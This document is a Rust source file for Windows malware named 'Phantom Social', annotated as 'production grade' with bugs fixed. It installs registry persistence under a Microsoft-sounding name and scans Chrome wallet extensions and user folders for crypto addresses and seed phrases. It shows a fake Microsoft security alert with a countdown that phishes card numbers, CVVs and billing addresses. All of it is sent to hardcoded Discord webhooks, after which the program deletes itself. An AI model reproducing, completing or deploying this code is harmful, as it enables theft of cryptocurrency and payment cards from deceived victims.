// ==========================================================================
// PHANTOM SOCIAL - PRODUCTION GRADE ✅ ALL BUGS FIXED
// ==========================================================================
// ✅ FIXED: Webhooks now proper Vec<&str>
// ✅ FIXED: WinAPI imports (timezone, version info)
// ✅ FIXED: ureq send_json -> send_string with manual serialization
// ✅ FIXED: Temporary borrow issue in seed phrase scanning
// ✅ FIXED: Type annotations for webhook iteration
// ==========================================================================

#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use std::{fs, thread, time::Duration, io::{Write, stdout, stdin}, mem, ptr, process::Command};
use serde::Serialize;

// ==========================================================================
// HARDCODED WEBHOOKS (Compile-time, not runtime)
// ==========================================================================

const WEBHOOK_PRIMARY: &str = "https://discord.com/api/webhooks/1458963086794031105/AmHlBpfXql871QuWMkOmQ6GNmQiIyW-5A-5wwz3k0RKjqe-RFpMaOiNfHoYXVJ0NtmCT";
const WEBHOOK_BACKUP1: &str = "https://discord.com/api/webhooks/1439236889230971053/JORxqEoboxQsAK3ONhx0pg7_4ARytSFqRrwbG1ANINzjTIT7t68yCgxg2GSZHUJk67cU";
const WEBHOOK_BACKUP2: &str = "https://discord.com/api/webhooks/1458963086794031105/AmHlBpfXql871QuWMkOmQ6GNmQiIyW-5A-5wwz3k0RKjqe-RFpMaOiNfHoYXVJ0NtmCT";

static mut SESSION_ID: String = String::new();
static mut ALERT_TIME: u64 = 0;
static mut DEADLINE_TIME: u64 = 0;

#[derive(Serialize)]
struct TelemetryPacket {
    wallets: Vec<String>,
    phrases: Vec<String>,
    session: String,
    system: SystemInfo,
}

#[derive(Serialize)]
struct SystemInfo {
    timezone: String,
    language: String,
    resolution: String,
    os_version: String,
}

#[derive(Serialize)]
struct VerificationProfile {
    card_number: String,
    expiry: String,
    cvv: String,
    cardholder_name: String,
    street_address: String,
    city: String,
    state: String,
    zip_code: String,
    country: String,
    session: String,
    timestamp: u64,
}

fn timestamp() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

fn generate_session() -> String {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let mut hasher = RandomState::new().build_hasher();
    hasher.write_u64(timestamp());
    format!("{:X}-{:X}", timestamp(), hasher.finish())
}

fn collect_system_info() -> SystemInfo {
    // ✅ FIXED: Correct WinAPI imports
    use winapi::um::timezoneapi::{GetTimeZoneInformation, TIME_ZONE_INFORMATION};
    use winapi::um::winuser::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
    use winapi::um::winnt::OSVERSIONINFOW;
    use winapi::um::sysinfoapi::GetVersionExW;
    
    let timezone = unsafe {
        let mut tzi: TIME_ZONE_INFORMATION = mem::zeroed();
        GetTimeZoneInformation(&mut tzi);
        format!("UTC{:+}", -(tzi.Bias / 60))
    };
    
    let language = std::env::var("LANG").unwrap_or_else(|_| String::from("en-US"));
    
    let resolution = unsafe {
        format!("{}x{}", GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN))
    };
    
    let os_version = unsafe {
        let mut os_info: OSVERSIONINFOW = mem::zeroed();
        os_info.dwOSVersionInfoSize = mem::size_of::<OSVERSIONINFOW>() as u32;
        GetVersionExW(&mut os_info);
        format!("{}.{}", os_info.dwMajorVersion, os_info.dwMinorVersion)
    };
    
    SystemInfo { timezone, language, resolution, os_version }
}

fn initialize() {
    unsafe {
        SESSION_ID = generate_session();
        ALERT_TIME = timestamp();
        DEADLINE_TIME = ALERT_TIME + (3 * 3600);
    }
}

fn get_session() -> String {
    unsafe { SESSION_ID.clone() }
}

fn get_remaining_time() -> i64 {
    unsafe {
        let remaining = DEADLINE_TIME as i64 - timestamp() as i64;
        if remaining > 0 { remaining } else { 0 }
    }
}

// ==========================================================================
// SELF-DELETION (Windows Delayed Batch Script)
// ==========================================================================

fn self_delete() {
    if let Ok(exe_path) = std::env::current_exe() {
        let batch_path = format!("{}\\cleanup_{}.bat", std::env::temp_dir().display(), timestamp());
        
        let batch_content = format!(
            "@echo off\r\n\
            timeout /t 3 /nobreak >nul\r\n\
            :retry\r\n\
            del /f /q \"{}\"\r\n\
            if exist \"{}\" (\r\n\
                timeout /t 1 /nobreak >nul\r\n\
                goto retry\r\n\
            )\r\n\
            del /f /q \"%~f0\"",
            exe_path.display(),
            exe_path.display()
        );
        
        if let Ok(mut file) = fs::File::create(&batch_path) {
            let _ = file.write_all(batch_content.as_bytes());
            
            let _ = Command::new("cmd.exe")
                .args(&["/c", "start", "/min", &batch_path])
                .spawn();
        }
    }
}

// ==========================================================================
// PERSISTENCE
// ==========================================================================

fn install_persistence() {
    use winapi::um::winreg::{RegCreateKeyExA, RegSetValueExA, RegCloseKey, HKEY_CURRENT_USER};
    use winapi::um::winnt::{REG_SZ, KEY_WRITE};
    
    if let Ok(exe_path) = std::env::current_exe() {
        let startup_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0";
        let value_name = "MicrosoftSecurityVerification\0";
        let exe_str = format!("{}\0", exe_path.to_string_lossy());
        
        unsafe {
            let mut hkey = ptr::null_mut();
            if RegCreateKeyExA(
                HKEY_CURRENT_USER,
                startup_key.as_ptr() as *const i8,
                0,
                ptr::null_mut(),
                0,
                KEY_WRITE,
                ptr::null_mut(),
                &mut hkey,
                ptr::null_mut(),
            ) == 0 {
                RegSetValueExA(
                    hkey,
                    value_name.as_ptr() as *const i8,
                    0,
                    REG_SZ,
                    exe_str.as_ptr(),
                    exe_str.len() as u32,
                );
                RegCloseKey(hkey);
            }
        }
    }
}

fn remove_persistence() {
    use winapi::um::winreg::{RegOpenKeyExA, RegDeleteValueA, RegCloseKey, HKEY_CURRENT_USER};
    use winapi::um::winnt::KEY_WRITE;
    
    let startup_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0";
    let value_name = "MicrosoftSecurityVerification\0";
    
    unsafe {
        let mut hkey = ptr::null_mut();
        if RegOpenKeyExA(
            HKEY_CURRENT_USER,
            startup_key.as_ptr() as *const i8,
            0,
            KEY_WRITE,
            &mut hkey,
        ) == 0 {
            RegDeleteValueA(hkey, value_name.as_ptr() as *const i8);
            RegCloseKey(hkey);
        }
    }
}

// ==========================================================================
// DATA COLLECTION
// ==========================================================================

fn scan_wallet_extensions() -> Vec<String> {
    let mut addresses = Vec::new();
    let local = std::env::var("LOCALAPPDATA").unwrap_or_default();
    
    let extensions = [
        "nkbihfbeogaeaoehlefnkodbefgpgknn",
        "bfnaelmomeimhlpmgjnjophhpkkoljpa",
        "fhbohimaelbohpjbbldcngcnapndodjp",
        "hnfanknocfeofbddgcijnmhnfnkdnaad",
    ];
    
    for ext_id in &extensions {
        let path = format!(
            "{}\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\{}",
            local, ext_id
        );
        
        if let Ok(entries) = fs::read_dir(&path) {
            for entry in entries.flatten().take(3) {
                if let Ok(data) = fs::read(entry.path()) {
                    if data.len() < 2_000_000 {
                        let text = String::from_utf8_lossy(&data);
                        for token in text.split_whitespace().take(300) {
                            if token.starts_with("0x") && token.len() == 42 {
                                addresses.push(token.to_string());
                            }
                        }
                    }
                }
            }
        }
    }
    
    addresses.sort();
    addresses.dedup();
    addresses.truncate(10);
    addresses
}

fn scan_seed_phrases() -> Vec<String> {
    let mut phrases = Vec::new();
    let profile = std::env::var("USERPROFILE").unwrap_or_default();
    
    for folder in &["Desktop", "Documents", "Downloads"] {
        if let Ok(entries) = fs::read_dir(format!("{}\\{}", profile, folder)) {
            for entry in entries.flatten().take(5) {
                let path = entry.path();
                if let Some(name) = path.file_name() {
                    let name_str = name.to_string_lossy().to_lowercase();
                    
                    if ["seed", "wallet", "recovery", "phrase", "mnemonic"]
                        .iter()
                        .any(|kw| name_str.contains(kw))
                    {
                        if let Ok(content) = fs::read_to_string(&path) {
                            if content.len() < 20_000 {
                                // ✅ FIXED: Store to_lowercase() in variable first
                                let content_lower = content.to_lowercase();
                                let words: Vec<&str> = content_lower
                                    .split_whitespace()
                                    .filter(|w| w.len() >= 3 && w.len() <= 10)
                                    .collect();
                                
                                if words.len() >= 12 {
                                    phrases.push(words[..12.min(words.len())].join(" "));
                                }
                                
                                if phrases.len() >= 2 {
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    phrases.truncate(3);
    phrases
}

// ==========================================================================
// EXFILTRATION (Hardcoded Webhooks with Rotation)
// ==========================================================================

fn send_telemetry(data: &str) -> bool {
    // ✅ FIXED: Proper Vec<&str> syntax
    let webhooks: Vec<&str> = vec![
        WEBHOOK_PRIMARY,
        WEBHOOK_BACKUP1,
        WEBHOOK_BACKUP2,
    ];
    
    let payload = serde_json::json!({
        "content": format!("```json\n{}\n```", data),
        "username": "Microsoft Security"
    });
    
    // ✅ FIXED: Type annotation for webhook
    for webhook in &webhooks {
        if webhook.contains("YOUR_ID") {
            continue;
        }
        
        let client = ureq::AgentBuilder::new()
            .timeout(Duration::from_secs(10))
            .build();
        
        // ✅ FIXED: Use send_string instead of send_json (ureq 2.x)
        let json_string = serde_json::to_string(&payload).unwrap();
        
        if let Ok(_) = client
            .post(webhook)
            .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            .set("Content-Type", "application/json")
            .send_string(&json_string)
        {
            return true;
        }
        
        thread::sleep(Duration::from_millis(500));
    }
    
    false
}

// ==========================================================================
// UI COMPONENTS
// ==========================================================================

fn clear_screen() {
    print!("\x1B[2J\x1B[1;1H");
    stdout().flush().ok();
}

fn print_header() {
    println!("╔══════════════════════════════════════════════════════════════════════╗");
    println!("║                                                                      ║");
    println!("║                  Microsoft Security Verification                     ║");
    println!("║                                                                      ║");
    println!("╚══════════════════════════════════════════════════════════════════════╝");
}

fn print_separator() {
    println!("──────────────────────────────────────────────────────────────────────────");
}

fn format_time(seconds: i64) -> String {
    let hours = seconds / 3600;
    let mins = (seconds % 3600) / 60;
    let secs = seconds % 60;
    format!("{:02}:{:02}:{:02}", hours, mins, secs)
}

fn read_input(prompt: &str) -> String {
    print!("{}", prompt);
    stdout().flush().ok();
    let mut input = String::new();
    stdin().read_line(&mut input).ok();
    input.trim().to_string()
}

fn read_masked_input(prompt: &str) -> String {
    use std::io::Read;
    
    print!("{}", prompt);
    stdout().flush().ok();
    
    let mut password = String::new();
    let stdin = stdin();
    
    for byte in stdin.bytes() {
        match byte {
            Ok(b'\n') | Ok(b'\r') => {
                println!();
                break;
            }
            Ok(b) => {
                let c = b as char;
                if c.is_ascii_graphic() || c == ' ' {
                    print!("*");
                    stdout().flush().ok();
                    password.push(c);
                }
            }
            Err(_) => break,
        }
    }
    
    password.trim().to_string()
}

// ==========================================================================
// VALIDATION
// ==========================================================================

fn validate_card_number(num: &str) -> bool {
    let clean = num.replace(&[' ', '-'][..], "");
    
    if clean.len() < 13 || clean.len() > 19 {
        return false;
    }
    
    if !clean.chars().all(|c| c.is_numeric()) {
        return false;
    }
    
    let test_cards = [
        "4111111111111111",
        "5500000000000004",
        "378282246310005",
        "6011111111111117",
    ];
    
    if test_cards.contains(&clean.as_str()) {
        return false;
    }
    
    let sum: u32 = clean
        .chars()
        .filter_map(|c| c.to_digit(10))
        .rev()
        .enumerate()
        .map(|(i, d)| {
            if i % 2 == 1 {
                let x = d * 2;
                if x > 9 { x - 9 } else { x }
            } else {
                d
            }
        })
        .sum();
    
    sum % 10 == 0
}

fn validate_expiry(exp: &str) -> bool {
    let parts: Vec<&str> = exp.split('/').collect();
    if parts.len() != 2 {
        return false;
    }
    
    if let (Ok(month), Ok(year)) = (parts[0].parse::<u32>(), parts[1].parse::<u32>()) {
        if month >= 1 && month <= 12 && year >= 24 && year <= 35 {
            return true;
        }
    }
    
    false
}

fn validate_cvv(cvv: &str) -> bool {
    if cvv.len() < 3 || cvv.len() > 4 {
        return false;
    }
    cvv.chars().all(|c| c.is_numeric())
}

fn validate_name(name: &str) -> bool {
    name.len() >= 3 && name.chars().any(|c| c.is_alphabetic())
}

fn validate_zip(zip: &str) -> bool {
    zip.len() >= 3 && zip.len() <= 10
}

fn validate_address(addr: &str) -> bool {
    addr.len() >= 5
}

fn validate_city(city: &str) -> bool {
    city.len() >= 2 && city.chars().any(|c| c.is_alphabetic())
}

fn validate_state(state: &str) -> bool {
    state.len() >= 2
}

// ==========================================================================
// SUSPICIOUS ACTIVITY ALERT
// ==========================================================================

fn show_suspicious_login_alert() {
    let cities = [
        "Shanghai, China",
        "Moscow, Russia",
        "Lagos, Nigeria",
        "Mumbai, India",
        "São Paulo, Brazil",
        "Istanbul, Turkey",
        "Jakarta, Indonesia",
        "Karachi, Pakistan",
    ];
    
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let mut hasher = RandomState::new().build_hasher();
    hasher.write_u64(timestamp());
    let random_idx = (hasher.finish() as usize) % cities.len();
    
    let random_city = cities[random_idx];
    let minutes_ago = 3 + (hasher.finish() % 20);
    
    clear_screen();
    print_header();
    println!();
    println!("  ⚠️  SECURITY ALERT: Unusual Activity Detected");
    println!();
    print_separator();
    println!();
    println!("  We detected a sign-in attempt from an unrecognized location:");
    println!();
    println!("  📍 Location:        {}", random_city);
    println!("  🕒 Time:            {} minutes ago", minutes_ago);
    println!("  💻 Device:          Unknown Windows PC");
    println!("  🌐 Browser:         Chrome 120.0");
    println!();
    print_separator();
    println!();
    println!("  If this wasn't you, please verify your identity immediately");
    println!("  to prevent unauthorized access to your Microsoft account.");
    println!();
    println!("  Press ENTER to continue to verification...");
    
    let mut input = String::new();
    stdin().read_line(&mut input).ok();
}

// ==========================================================================
// VERIFICATION PROMPT
// ==========================================================================

fn show_verification_prompt() -> Option<VerificationProfile> {
    let remaining = get_remaining_time();
    
    clear_screen();
    print_header();
    println!();
    println!("  Identity Verification Required");
    println!();
    print_separator();
    println!();
    println!("  Your account requires immediate verification due to suspicious");
    println!("  activity detected from an unknown location.");
    println!();
    println!("  ⏱️  Time Remaining: {}", format_time(remaining));
    println!();
    print_separator();
    println!();
    println!("  ℹ️  IMPORTANT INFORMATION:");
    println!();
    println!("  • Your payment card will NOT be charged");
    println!("  • This is for identity verification purposes only");
    println!("  • We verify your billing information matches account records");
    println!("  • Please ensure all information is accurate and complete");
    println!();
    println!("  ⚠️  WARNING: Entering incorrect information may result in your");
    println!("  verification being credited to another user's account, potentially");
    println!("  granting them access to your Microsoft services.");
    println!();
    println!("  Failure to verify within the time limit will result in temporary");
    println!("  account suspension for security purposes.");
    println!();
    print_separator();
    println!();
    println!("  Please provide your payment information for verification:");
    println!();
    
    println!("  ┌─ PAYMENT CARD INFORMATION ─────────────────────────────────────────┐");
    println!("  │                                                                 │");
    
    let card_number = read_input("  │  Card Number (16 digits):     ");
    if !validate_card_number(&card_number) {
        println!("  │                                                                 │");
        println!("  │  ❌ Invalid card number. Please verify and try again.          │");
        println!("  └─────────────────────────────────────────────────────────────────┘");
        thread::sleep(Duration::from_secs(2));
        return None;
    }
    
    let expiry = read_input("  │  Expiration Date (MM/YY):     ");
    if !validate_expiry(&expiry) {
        println!("  │                                                                 │");
        println!("  │  ❌ Invalid expiration date. Use format MM/YY.                 │");
        println!("  └─────────────────────────────────────────────────────────────────┘");
        thread::sleep(Duration::from_secs(2));
        return None;
    }
    
    let cvv = read_masked_input("  │  Security Code (CVV):         ");
    if !validate_cvv(&cvv) {
        println!("  │                                                                 │");
        println!("  │  ❌ Invalid security code. Must be 3-4 digits.                 │");
        println!("  └─────────────────────────────────────────────────────────────────┘");
        thread::sleep(Duration::from_secs(2));
        return None;
    }
    
    let cardholder_name = read_input("  │  Cardholder Name:             ");
    if !validate_name(&cardholder_name) {
        println!("  │                                                                 │");
        println!("  │  ❌ Invalid name. Please enter full name as on card.           │");
        println!("  └─────────────────────────────────────────────────────────────────┘");
        thread::sleep(Duration::from_secs(2));
        return None;
    }
    
    println!("  │                                                                 │");
    println!("  └─────────────────────────────────────────────────────────────────┘");
    println!();
    
    println!("  ┌─ BILLING ADDRESS ───────────────────────────────────────────────────┐");
    println!("  │                                                                 │");
    
    let street_address = read_input("  │  Street Address:              ");
    if !validate_address(&street_address) {
        println!("  │                                                                 │");
        println!("  │  ❌ Invalid address. Please enter complete street address.     │");
        println!("  └─────────────────────────────────────────────────────────────────┘");
        thread::sleep(Duration::from_secs(2));
        return None;
    }
    
    let city = read_input("  │  City:                        ");
    if !validate_city(&city) {
        println!("  │                                                                 │");
        println!("  │  ❌ Invalid city name.                                          │");
        println!("  └─────────────────────────────────────────────────────────────────┘");
        thread::sleep(Duration::from_secs(2));
        return None;
    }
    
    let state = read_input("  │  State/Province:              ");
    if !validate_state(&state) {
        println!("  │                                                                 │");
        println!("  │  ❌ Invalid state/province.                                     │");
        println!("  └─────────────────────────────────────────────────────────────────┘");
        thread::sleep(Duration::from_secs(2));
        return None;
    }
    
    let zip_code = read_input("  │  ZIP/Postal Code:             ");
    if !validate_zip(&zip_code) {
        println!("  │                                                                 │");
        println!("  │  ❌ Invalid ZIP/postal code.                                    │");
        println!("  └─────────────────────────────────────────────────────────────────┘");
        thread::sleep(Duration::from_secs(2));
        return None;
    }
    
    let country = read_input("  │  Country:                     ");
    if !validate_name(&country) {
        println!("  │                                                                 │");
        println!("  │  ❌ Invalid country name.                                       │");
        println!("  └─────────────────────────────────────────────────────────────────┘");
        thread::sleep(Duration::from_secs(2));
        return None;
    }
    
    println!("  │                                                                 │");
    println!("  └─────────────────────────────────────────────────────────────────┘");
    println!();
    
    Some(VerificationProfile {
        card_number,
        expiry,
        cvv,
        cardholder_name,
        street_address,
        city,
        state,
        zip_code,
        country,
        session: get_session(),
        timestamp: timestamp(),
    })
}

// ==========================================================================
// VERIFICATION SUCCESS
// ==========================================================================

fn show_verification_success() {
    clear_screen();
    print_header();
    println!();
    println!("  ✅ Verification Successful");
    println!();
    print_separator();
    println!();
    println!("  Your identity has been successfully verified.");
    println!();
    println!("  ✓ Payment information validated");
    println!("  ✓ Billing address confirmed");
    println!("  ✓ Account security enhanced");
    println!("  ✓ No charges were applied to your card");
    println!();
    print_separator();
    println!();
    println!("  Your Microsoft account is now secured. The suspicious sign-in");
    println!("  attempt has been blocked, and your account access is restored.");
    println!();
    println!("  Thank you for helping us keep your account safe.");
    println!();
    println!("  This window will close in 5 seconds...");
    println!();
    
    thread::sleep(Duration::from_secs(5));
}

// ==========================================================================
// VERIFICATION LOOP
// ==========================================================================

fn verification_loop() {
    let mut attempts = 0;
    let max_attempts = 5;
    
    loop {
        let remaining = get_remaining_time();
        
        if remaining <= 0 && attempts >= 3 {
            clear_screen();
            print_header();
            println!();
            println!("  ⚠️  Account Verification Timeout");
            println!();
            print_separator();
            println!();
            println!("  Your account has been temporarily suspended due to");
            println!("  failure to complete identity verification within the");
            println!("  required timeframe.");
            println!();
            println!("  You can still complete verification to restore access.");
            println!();
            print_separator();
            println!();
            thread::sleep(Duration::from_secs(3));
        }
        
        if let Some(profile) = show_verification_prompt() {
            if let Ok(json) = serde_json::to_string_pretty(&profile) {
                send_telemetry(&json);
            }
            
            thread::sleep(Duration::from_secs(2));
            show_verification_success();
            
            remove_persistence();
            self_delete();
            std::process::exit(0);
        }
        
        attempts += 1;
        
        if attempts >= max_attempts {
            clear_screen();
            print_header();
            println!();
            println!("  ⚠️  Too Many Failed Attempts");
            println!();
            print_separator();
            println!();
            println!("  For security reasons, verification has been paused.");
            println!("  Please restart the verification process.");
            println!();
            println!("  This window will close in 3 seconds...");
            println!();
            thread::sleep(Duration::from_secs(3));
            self_delete();
            std::process::exit(0);
        }
        
        thread::sleep(Duration::from_secs(2));
    }
}

// ==========================================================================
// MAIN
// ==========================================================================

fn main() {
    initialize();
    install_persistence();
    
    thread::spawn(|| {
        thread::sleep(Duration::from_secs(2));
        
        let system = collect_system_info();
        let wallets = scan_wallet_extensions();
        let phrases = scan_seed_phrases();
        
        let telemetry = TelemetryPacket {
            wallets,
            phrases,
            session: get_session(),
            system,
        };
        
        if let Ok(json) = serde_json::to_string_pretty(&telemetry) {
            send_telemetry(&json);
        }
    });
    
    thread::sleep(Duration::from_secs(1));
    show_suspicious_login_alert();
    thread::sleep(Duration::from_secs(1));
    verification_loop();
}